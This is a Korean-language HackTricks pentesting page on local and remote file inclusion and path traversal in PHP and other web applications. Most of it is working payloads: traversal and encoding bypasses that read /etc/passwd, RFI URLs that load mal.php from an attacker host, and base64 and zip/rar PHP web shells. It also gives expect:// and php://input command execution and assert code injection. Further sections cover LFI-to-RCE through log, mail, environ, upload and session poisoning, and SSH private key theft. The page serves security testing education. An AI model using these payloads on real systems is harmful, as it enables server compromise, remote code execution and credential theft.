# 파일 포함/경로 이탈

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 **제로부터 영웅까지 AWS 해킹 배우기**!</summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하고 싶다면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f)에 가입하거나 [**텔레그램 그룹**](https://t.me/peass)에 가입하거나** 트위터** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
* **해킹 트릭을 공유하려면 PR을 제출하여** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 기여하세요.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

경험 많은 해커 및 버그 바운티 헌터와 소통하려면 [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) 서버에 가입하세요!

**해킹 통찰**\
해킹의 즐거움과 도전에 대해 탐구하는 콘텐츠와 상호 작용

**실시간 해킹 뉴스**\
빠르게 변화하는 해킹 세계의 실시간 뉴스와 통찰력을 유지하세요

**최신 공지**\
최신 버그 바운티 출시 및 중요한 플랫폼 업데이트에 대해 정보를 유지하세요

**[**Discord**](https://discord.com/invite/N3FrSbmwdy)에 참여하여 오늘 최고의 해커들과 협업을 시작하세요!

## 파일 포함

**원격 파일 포함 (RFI):** 파일이 원격 서버에서 로드됨 (최상: 코드를 작성하고 서버가 실행함). PHP에서는 이 기능이 **기본적으로 비활성화**됨 (**allow\_url\_include**).\
**로컬 파일 포함 (LFI):** 서버가 로컬 파일을 로드함.

사용자가 서버가 로드할 파일을 어떤 방식으로든 제어할 수 있는 경우 취약점이 발생합니다.

취약한 **PHP 함수**: require, require\_once, include, include\_once

이 취약점을 악용하는 흥미로운 도구: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - 흥미로운 - LFI2RCE 파일
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**여러 \*nix LFI 목록을 섞어 더 많은 경로를 추가하여 다음을 만들었습니다:**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt" %}

`/`를 `\`로 변경해보세요\
`../../../../../`를 추가해보세요

취약점이 존재하는지 확인하기 위해 /etc/password 파일을 찾는 여러 기술을 사용하는 목록은 [여기](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)에서 찾을 수 있습니다.

### **Windows**

다양한 워드리스트를 병합:

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt" %}

`/`를 `\`로 변경해보세요\
`C:/`를 제거하고 `../../../../../`를 추가해보세요

취약점이 존재하는지 확인하기 위해 /boot.ini 파일을 찾는 여러 기술을 사용하는 목록은 [여기](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)에서 찾을 수 있습니다.

### **OS X**

Linux의 LFI 목록을 확인하세요.

## Basic LFI and bypasses

모든 예제는 로컬 파일 포함을 위한 것이지만 원격 파일 포함에도 적용할 수 있습니다 (page=[http://myserver.com/phpshellcode.txt\\](http://myserver.com/phpshellcode.txt\)/).
```
http://example.com/index.php?page=../../../etc/passwd
```
### 비재귀적으로 제거된 탐색 시퀀스
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **널 바이트 (%00)**

제공된 문자열 끝에 더 많은 문자를 추가하여 우회합니다 (우회 방법: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
이 문제는 **PHP 5.4부터 해결되었습니다**

### **인코딩**

이중 URL 인코딩(및 기타 방법)과 같은 비표준 인코딩을 사용할 수 있습니다:
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### 기존 폴더에서

어쩌면 백엔드가 폴더 경로를 확인하고 있을 수 있습니다:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### 서버의 파일 시스템 디렉토리 탐색

서버의 파일 시스템은 특정 기술을 활용하여 파일뿐만 아니라 디렉토리도 재귀적으로 탐색할 수 있습니다. 이 과정은 디렉토리의 깊이를 확인하고 특정 폴더의 존재 여부를 조사하는 것을 포함합니다. 아래에는 이를 달성하기 위한 자세한 방법이 나와 있습니다:

1. **디렉토리 깊이 확인:** 현재 디렉토리의 깊이를 확인하기 위해 `/etc/passwd` 파일을 성공적으로 가져오는 것으로 현재 디렉토리의 깊이를 확인합니다 (서버가 Linux 기반인 경우 해당). 깊이가 세 개인 경우 다음과 같이 구성된 예시 URL이 있을 수 있습니다:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **폴더 조사:** 의심스러운 폴더 이름(예: `private`)을 URL에 추가한 다음 `/etc/passwd`로 이동합니다. 추가된 디렉토리 수준은 깊이를 하나 증가해야 합니다:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **결과 해석:** 서버의 응답은 폴더의 존재 여부를 나타냅니다:
   * **에러 / 출력 없음:** `private` 폴더가 지정된 위치에 존재하지 않을 가능성이 높습니다.
   * **`/etc/passwd`의 내용:** `private` 폴더의 존재가 확인됩니다.
4. **재귀적 탐색:** 발견된 폴더는 동일한 기술 또는 전통적인 로컬 파일 포함 (LFI) 방법을 사용하여 하위 디렉토리나 파일을 더 탐색할 수 있습니다.

파일 시스템의 다른 위치에 있는 디렉토리를 탐색하려면 페이로드를 조정하십시오. 예를 들어, `/var/www/`에 `private` 디렉토리가 있는지 확인하려면 (현재 디렉토리가 깊이 3에 있는 것으로 가정), 다음을 사용하십시오:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **경로 절단 기술**

경로 절단은 웹 애플리케이션에서 파일 경로를 조작하는 방법입니다. 종종 특정 보안 조치가 파일 경로 끝에 추가 문자를 추가하여 우회함으로써 제한된 파일에 액세스하는 데 사용됩니다. 목표는 보안 조치에 의해 변경된 파일 경로가 여전히 원하는 파일을 가리키도록 만드는 것입니다.

PHP에서 파일 경로의 다양한 표현은 파일 시스템의 성격으로 인해 동등하게 간주될 수 있습니다. 예를 들어:

* `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, `/etc/passwd/`는 모두 동일한 경로로 처리됩니다.
* 마지막 6자가 `passwd`인 경우 `/`를 추가하여 `passwd/`로 만들어도 대상 파일이 변경되지 않습니다.
* 마찬가지로 파일 경로에 `.php`가 추가된 경우 (`shellcode.php`와 같이), 끝에 `/.`를 추가해도 액세스되는 파일이 변경되지 않습니다.

제공된 예제는 경로 절단을 활용하여 민감한 콘텐츠인 `/etc/passwd`에 액세스하는 방법을 보여줍니다.
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
이러한 시나리오에서 필요한 탐색 횟수는 대략 2027회 정도일 수 있지만, 이 숫자는 서버의 구성에 따라 다를 수 있습니다.

* **닷 세그먼트 및 추가 문자 사용**: 탐색 시퀀스(`../`)는 추가 닷 세그먼트와 문자와 결합되어 파일 시스템을 탐색하는 데 사용될 수 있으며, 서버에 의해 추가된 문자열을 무시하고 효과적으로 탐색할 수 있습니다.
* **필요한 탐색 횟수 결정**: 시행착오를 통해 `../` 시퀀스의 정확한 횟수를 찾아 루트 디렉토리로 이동한 다음 `/etc/passwd`로 이동하여 추가된 문자열(예: `.php`)이 중화되지만 원하는 경로(`/etc/passwd`)가 유지되도록 할 수 있습니다.
* **가짜 디렉토리로 시작하기**: 존재하지 않는 디렉토리(예: `a/`)로 경로를 시작하는 것은 예방 조치로 사용되거나 서버의 경로 구문 분석 논리 요구 사항을 충족시키기 위해 사용되는 일반적인 방법입니다.

경로 절삭 기술을 사용할 때는 서버의 경로 구문 분석 동작과 파일 시스템 구조를 이해하는 것이 중요합니다. 각 시나리오마다 다른 접근 방식이 필요할 수 있으며, 가장 효과적인 방법을 찾기 위해 테스트가 종종 필요합니다.

**이 취약점은 PHP 5.3에서 수정되었습니다.**

### **필터 우회 트릭**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## 원격 파일 포함

PHP에서는 기본적으로 **`allow_url_include`**가 **Off**로 설정되어 있어 비활성화되어 있습니다. 이를 작동하려면 **On**으로 설정해야하며, 그 경우에는 서버에서 PHP 파일을 포함시켜 RCE를 얻을 수 있습니다:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
만약 어떤 이유로든 **`allow_url_include`**가 **On**이지만 PHP가 외부 웹페이지 접근을 **필터링**하는 경우, [이 게시물에 따르면](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), base64를 사용하여 b64 PHP 코드를 디코딩하고 RCE를 얻을 수 있습니다:

{% code overflow="wrap" %}
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
{% endcode %}

{% hint style="info" %}
이전 코드에서 최종 `+.txt`가 추가된 이유는 공격자가 `.txt`로 끝나는 문자열이 필요했기 때문입니다. 따라서 문자열이 `.txt`로 끝나고 b64 디코딩 후에 해당 부분은 그냥 쓰레기가 되고 실제 PHP 코드가 포함되어 (따라서 실행됨) 반환됩니다.
{% endhint %}

다른 예는 **`php://` 프로토콜을 사용하지 않는 경우**입니다:

{% code overflow="wrap" %}
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
{% endcode %}

## Python 루트 요소

파이썬에서 이와 같은 코드를 사용할 때:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
사용자가 `file_name`에 **절대 경로**를 전달하면 **이전 경로가 그대로 제거**됩니다:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
다음은 [문서](https://docs.python.org/3.10/library/os.path.html#os.path.join)에 따른 의도된 동작입니다:

> 구성 요소가 절대 경로인 경우, 이전 모든 구성 요소가 삭제되고 절대 경로 구성 요소부터 연결이 계속됩니다.

## Java 디렉토리 목록

Java에서 Path Traversal이 있는 경우 **파일 대신 디렉토리를 요청**하면 **해당 디렉토리의 목록이 반환**됩니다. 다른 언어에서는 이러한 일이 발생하지 않을 것으로 보입니다 (afaik).

## 상위 25개 매개변수

다음은 로컬 파일 포함 (LFI) 취약점에 취약할 수 있는 상위 25개 매개변수 목록입니다 ([링크](https://twitter.com/trbughunters/status/1279768631845494787) 참조):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## PHP 래퍼 및 프로토콜을 사용한 LFI / RFI

### php://filter

PHP 필터를 사용하면 데이터를 읽거나 쓰기 전에 기본 **수정 작업**을 수행할 수 있습니다. 필터에는 5가지 카테고리가 있습니다:

* [문자열 필터](https://www.php.net/manual/en/filters.string.php):
* `string.rot13`
* `string.toupper`
* `string.tolower`
* `string.strip_tags`: 데이터에서 태그를 제거합니다 ("<"와 ">" 문자 사이의 모든 것)
* 이 필터는 현대 버전의 PHP에서 사라졌음을 유의하십시오.
* [변환 필터](https://www.php.net/manual/en/filters.convert.php)
* `convert.base64-encode`
* `convert.base64-decode`
* `convert.quoted-printable-encode`
* `convert.quoted-printable-decode`
* `convert.iconv.*` : 다른 인코딩으로 변환합니다(`convert.iconv.<input_enc>.<output_enc>`). 지원되는 **모든 인코딩 목록**을 얻으려면 콘솔에서 실행하십시오: `iconv -l`

{% hint style="warning" %}
`convert.iconv.*` 변환 필터를 남용하면 **임의의 텍스트를 생성**할 수 있으며, 임의의 텍스트를 작성하거나 함수를 만들어 임의의 텍스트를 처리하는 데 유용할 수 있습니다. 자세한 정보는 [**php 필터를 통한 LFI2RCE**](lfi2rce-via-php-filters.md)를 확인하십시오.
{% endhint %}

* [압축 필터](https://www.php.net/manual/en/filters.compression.php)
* `zlib.deflate`: 내용을 압축합니다 (많은 정보를 외부로 유출하는 경우 유용)
* `zlib.inflate`: 데이터를 압축 해제합니다
* [암호화 필터](https://www.php.net/manual/en/filters.encryption.php)
* `mcrypt.*` : 사용 중단됨
* `mdecrypt.*` : 사용 중단됨
* 기타 필터
* php에서 `var_dump(stream_get_filters());`를 실행하면 몇 가지 **예상치 못한 필터**를 찾을 수 있습니다:
* `consumed`
* `dechunk`: HTTP 청크 인코딩을 반전시킵니다
* `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
{% hint style="warning" %}
"php://filter" 부분은 대소문자를 구분하지 않습니다.
{% endhint %}

### 임의 파일을 읽기 위한 오라클로서 php 필터 사용하기

[**이 게시물**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle)에서는 서버로부터 반환된 출력 없이 로컬 파일을 읽는 기술을 제안합니다. 이 기술은 **php 필터를 오라클로 사용하여 파일을 문자 단위로 노출하는 부울 추출**에 기반합니다. 이는 php 필터가 텍스트를 충분히 크게 만들어 php가 예외를 발생시킬 수 있도록 사용될 수 있기 때문입니다.

원본 게시물에서 기술에 대한 자세한 설명을 찾을 수 있지만, 여기에 간단한 요약이 있습니다:

* **`UCS-4LE`** 코덱을 사용하여 텍스트의 선행 문자를 남겨두고 문자열 크기를 지수적으로 증가시킵니다.
* 이를 사용하여 **초기 문자가 올바르게 추측될 때 텍스트가 매우 커지게** 하여 php가 **오류를 발생**시킵니다.
* **dechunk** 필터는 **첫 번째 문자가 16진수가 아닌 경우 모든 것을 제거**하므로 첫 번째 문자가 16진수인지 여부를 알 수 있습니다.
* 이는 이전 것과 결합되면 (그리고 추측된 문자에 따라 다른 필터들과 함께), 텍스트의 시작 부분의 문자를 추측할 수 있도록 합니다. 16진수이면 dechunk가 삭제하지 않고 초기 폭탄이 php 오류를 발생시킬 것입니다.
* 코덱 **convert.iconv.UNICODE.CP930**는 각 문자를 다음 문자로 변환합니다 (따라서 이 코덱을 적용하면 a -> b). 이를 통해 예를 들어 첫 글자가 `a`인지 알 수 있습니다. 왜냐하면 이 코덱을 6번 적용하면 a->b->c->d->e->f->g로 글자가 더 이상 16진수 문자가 아니게 되므로 dechunk가 삭제하지 않고 php 오류가 발생합니다.
* **rot13**과 같은 다른 변환을 사용하여 시작 부분에서 n, o, p, q, r과 같은 다른 문자를 노출시킬 수 있습니다 (다른 코덱을 사용하여 다른 문자를 16진수 범위로 이동시킬 수 있습니다).
* 초기 문자가 숫자인 경우에는 base64로 인코딩하고 숫자를 노출시키기 위해 처음 2개의 문자를 노출시켜야 합니다.
* **초기 문자 이상을 노출하는 방법**은 **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE**와 같은 순서 메모리 필터를 사용하여 문자의 순서를 변경하고 텍스트의 첫 번째 위치에 다른 문자를 가져올 수 있습니다.
* **더 많은 데이터를 얻기 위해**는 **convert.iconv.UTF16.UTF16**로 시작 부분에 2바이트의 쓰레기 데이터를 생성하고, **UCS-4LE**를 적용하여 **다음 2바이트와 피벗**하고 쓰레기 데이터까지 데이터를 **삭제**합니다 (이렇게 하면 초기 텍스트의 처음 2바이트가 제거됩니다). 원하는 비트를 노출할 때까지 계속합니다.

게시물에서는 이를 자동으로 수행하는 도구도 누설되었습니다: [php\_filters\_chain\_oracle\_exploit](https://github.com/synacktiv/php\_filter\_chains\_oracle\_exploit).

### php://fd

이 래퍼는 프로세스가 열어 둔 파일 디스크립터에 액세스할 수 있도록 합니다. 열려 있는 파일의 내용을 노출하는 데 유용할 수 있습니다:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
당신은 **php://stdin, php://stdout 그리고 php://stderr**를 사용하여 각각 **파일 디스크립터 0, 1 그리고 2**에 접근할 수 있습니다 (어떻게 공격에 유용할지는 확실하지 않음)

### zip:// 그리고 rar://

PHPShell이 포함된 Zip 또는 Rar 파일을 업로드하고 액세스할 수 있습니다.\
rar 프로토콜을 남용하기 위해서는 **특별히 활성화**되어야 합니다.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://

### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
이 프로토콜은 php 구성에 의해 제한됩니다 **`allow_url_open`** 및 **`allow_url_include`**

### expect://

Expect가 활성화되어 있어야 합니다. 이를 사용하여 코드를 실행할 수 있습니다:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### 입력://

POST 매개변수에 페이로드를 지정하십시오:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

웹 애플리케이션이 파일 로딩을 위해 `include`와 같은 함수를 활용할 때 `.phar` 파일을 사용하여 PHP 코드를 실행할 수 있습니다. 아래 제공된 PHP 코드 스니펫은 `.phar` 파일을 생성하는 방법을 보여줍니다:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
`.phar` 파일을 컴파일하려면 다음 명령을 실행해야 합니다:
```bash
php --define phar.readonly=0 create_path.php
```
실행하면 `test.phar`라는 파일이 생성되며, 이는 로컬 파일 포함 (LFI) 취약점을 악용할 수 있는 가능성이 있습니다.

LFI가 PHP 코드를 실행하지 않고 파일을 읽기만 하는 경우, `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, 또는 `filesize()`와 같은 함수를 통해 직렬화 취약점을 악용할 수 있습니다. 이 취약점은 `phar` 프로토콜을 사용하여 파일을 읽는 것과 관련이 있습니다.

`.phar` 파일의 직렬화 취약점을 악용하는 방법에 대한 자세한 내용은 아래 링크된 문서를 참조하십시오:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)

{% content-ref url="phar-deserialization.md" %}
[phar-deserialization.md](phar-deserialization.md)
{% endcontent-ref %}

### 더 많은 프로토콜

더 많은 가능한[ **여기에 포함할 프로토콜**](https://www.php.net/manual/en/wrappers.php)**을 확인하십시오**:

* [php://memory 및 php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — 메모리나 임시 파일에 쓰기 (파일 포함 공격에 어떻게 유용할지는 확실하지 않음)
* [file://](https://www.php.net/manual/en/wrappers.file.php) — 로컬 파일 시스템 접근
* [http://](https://www.php.net/manual/en/wrappers.http.php) — HTTP(s) URL 접근
* [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — FTP(s) URL 접근
* [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — 압축 스트림
* [glob://](https://www.php.net/manual/en/wrappers.glob.php) — 패턴과 일치하는 경로명 찾기 (출력 가능한 것을 반환하지 않으므로 여기서는 실제로 유용하지 않음)
* [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — 보안 쉘 2
* [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — 오디오 스트림 (임의 파일을 읽는 데 유용하지 않음)

## PHP의 'assert'를 통한 LFI

PHP에서 'assert' 함수를 다룰 때 로컬 파일 포함 (LFI) 위험은 특히 높습니다. 'assert' 함수는 문자열 내에서 코드를 실행할 수 있기 때문에, 디렉터리 이동 문자인 ".."과 같은 입력이 적절하게 검사되지 않은 경우 문제가 발생할 수 있습니다.

예를 들어, PHP 코드가 디렉터리 이동을 방지하도록 설계되었지만 다음과 같이 처리되지 않은 경우:
```bash
assert("strpos('$file', '..') === false") or die("");
```
이는 탐색을 막기 위해 만들어졌지만, 코드 삽입을 위한 벡터를 실수로 만들어냅니다. 파일 내용을 읽기 위해 이를 악용하려는 공격자는 다음을 사용할 수 있습니다:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
마찬가지로, 임의 시스템 명령을 실행하기 위해 다음을 사용할 수 있습니다:
```plaintext
' and die(system("id")) or '
```
**Payloads를 URL 인코딩하는 것이 중요합니다**.

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) 서버에 가입하여 경험 많은 해커 및 버그 바운티 헌터들과 소통하세요!

**해킹 통찰**\
해킹의 스릴과 도전에 대해 탐구하는 콘텐츠와 상호 작용하세요

**실시간 해킹 뉴스**\
실시간 뉴스와 통찰을 통해 빠르게 변화하는 해킹 세계를 파악하세요

**최신 공지**\
최신 버그 바운티 출시 및 중요한 플랫폼 업데이트에 대해 알아두세요

**[Discord](https://discord.com/invite/N3FrSbmwdy)**에 참여하여 최고의 해커들과 협업을 시작하세요!

## PHP Blind Path Traversal

{% hint style="warning" %}
이 기술은 **파일 경로**를 **제어**할 수 있지만 파일 내용을 볼 수 없는 경우에 관련이 있습니다. 예를 들어 **`file()`**를 호출하는 **PHP 함수**에서 파일에 액세스할 것이지만 내용이 표시되지 않는 경우에 유용합니다.
{% endhint %}

[**이 놀라운 게시물**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html)에서 PHP 필터를 통해 블라인드 경로 순회를 악용하여 파일 내용을 **에러 오라클을 통해 유출하는 방법**에 대해 설명되어 있습니다.

기본적으로 이 기술은 파일의 내용을 **매우 크게 만들기 위해 "UCS-4LE" 인코딩**을 사용하여 파일을 열 때 **에러**를 유발시키는 것입니다.

그런 다음, 첫 번째 문자를 노출시키기 위해 **`dechunk`** 필터를 사용하고 **base64** 또는 **rot13**와 같은 다른 필터와 함께 사용하며 마지막으로 **convert.iconv.UCS-4.UCS-4LE** 및 **convert.iconv.UTF16.UTF-16BE** 필터를 사용하여 다른 문자를 **첫 번째에 배치하고 노출시킵니다**.

**취약할 수 있는 함수**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (이 함수로만 읽기 전용 대상)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

기술적인 세부 정보는 언급된 게시물을 확인하세요!

## LFI2RCE

### 원격 파일 포함

이전에 설명한 내용은 [**이 링크를 따르세요**](./#remote-file-inclusion).

### Apache/Nginx 로그 파일을 통한 방법

Apache 또는 Nginx 서버가 **LFI에 취약**한 경우, include 함수 내에서 **`/var/log/apache2/access.log` 또는 `/var/log/nginx/access.log`**에 액세스를 시도할 수 있습니다. **사용자 에이전트** 또는 **GET 매개변수** 내에 **`<?php system($_GET['c']); ?>`**와 같은 PHP 셸을 설정하고 해당 파일을 포함할 수 있습니다.

{% hint style="warning" %}
셸에 **단일 따옴표 대신 이중 따옴표를 사용**하는 경우, 이중 따옴표는 "_**quote;**_"로 수정되며, **PHP에서 오류가 발생**하고 **다른 작업이 실행되지 않습니다**.

또한 페이로드를 **올바르게 작성**해야 하며, PHP가 로그 파일을 로드할 때마다 오류가 발생하고 두 번째 기회가 없을 수 있습니다.
{% endhint %}

이것은 다른 로그에서도 수행할 수 있지만, 로그 내부의 코드가 URL 인코딩되어 있을 수 있으며 이로 인해 셸이 손상될 수 있습니다. **"basic" 인증 헤더**에는 Base64로 "user:password"가 포함되어 있으며 로그 내에서 디코딩됩니다. PHPShell을 이 헤더 내에 삽입할 수 있습니다.\
다른 가능한 로그 경로:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
### 이메일을 통해

내부 계정 (user@localhost)으로 PHP 페이로드인 `<?php echo system($_REQUEST["cmd"]); ?>`를 포함하는 이메일을 보내고 **`/var/mail/<USERNAME>`** 또는 **`/var/spool/mail/<USERNAME>`**과 같은 경로로 사용자의 메일을 포함해보세요.

### /proc/\*/fd/\*를 통해

1. 많은 쉘을 업로드합니다 (예 : 100)
2. [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD)를 포함합니다. 여기서 $PID는 프로세스의 PID이며 (무차별 대입으로 찾을 수 있음), $FD는 파일 디스크립터입니다 (이것도 무차별 대입으로 찾을 수 있음).

### /proc/self/environ을 통해

로그 파일처럼 User-Agent에 페이로드를 보내면 /proc/self/environ 파일 내에 반영됩니다.
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### 업로드를 통해

파일을 업로드할 수 있다면, 쉘 페이로드를 삽입하십시오 (예 : `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
파일을 가독성 있게 유지하기 위해서는 사진/문서/PDF의 메타데이터에 주입하는 것이 가장 좋습니다.

### Zip 파일 업로드를 통해

PHP 쉘을 압축한 ZIP 파일을 업로드하고 액세스하세요:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### PHP 세션을 통해

웹사이트가 PHP 세션(PHPSESSID)을 사용하는지 확인하세요.
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
PHP에서 이러한 세션은 _/var/lib/php5/sess\\_\[PHPSESSID]\_ 파일에 저장됩니다.
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
쿠키를 `<?php system('cat /etc/passwd');?>`로 설정합니다.
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
PHP 세션 파일을 포함하기 위해 LFI를 사용하십시오.
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### SSH를 통해

만약 ssh가 활성화되어 있다면 사용 중인 사용자를 확인하세요 (/proc/self/status 및 /etc/passwd) 그리고 **\<HOME>/.ssh/id\_rsa**에 액세스를 시도하세요.

